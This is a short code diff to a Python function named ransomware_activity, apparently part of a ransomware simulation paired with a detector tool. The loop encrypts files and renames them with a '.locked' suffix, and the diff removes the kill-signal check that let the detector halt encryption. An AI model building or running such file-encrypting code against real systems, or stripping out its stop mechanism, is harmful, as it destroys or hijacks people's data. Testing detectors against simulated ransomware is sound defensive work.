@@ -79,10 +79,6 @@ def ransomware_activity():
         if not os.path.isfile(path) or path.endswith('.locked'):
             continue
 
-        if os.path.exists(os.path.join(base_path, ".kill_signal")):
-            print("\n🛡️ BLOCKED BY PREVENTOR! Ransomware encryption process abruptly stopped natively by Detector.")
-            break
-
         encrypt_file(path)
 
         new_path = path + ".locked"
